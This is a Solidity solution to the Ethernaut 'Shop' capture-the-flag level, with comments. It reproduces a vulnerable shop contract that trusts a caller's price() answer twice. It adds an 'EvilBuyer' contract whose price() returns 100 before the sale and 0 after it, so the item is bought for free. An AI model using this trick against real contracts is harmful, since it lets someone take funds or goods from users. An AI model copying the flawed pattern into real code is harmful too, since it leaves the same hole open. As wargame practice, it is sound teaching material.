// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;
//ethernaut address 0xFc1327AbB3f7434DBdb8138aa26af2A9D101886A
// (NOTE: Ethernaut expects the public variable price to be less than 100 after the puzzle is solved)
interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

    constructor(){

    }
  function buy() public {
    Buyer _buyer = Buyer(msg.sender);
    // here we call price, and we must return 100
    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      //here we call price again, but this time we return 0
      price = _buyer.price();
    }
  }
}




contract EvilBuyer is Buyer{

    Shop public target;

    constructor(address _target){
        target = Shop(_target);
    }

    function attack() public {
        target.buy();
    }

    function price() external view returns (uint result){
        if(target.isSold()){
            return 0;
        }
        return 100;
        
    }
}
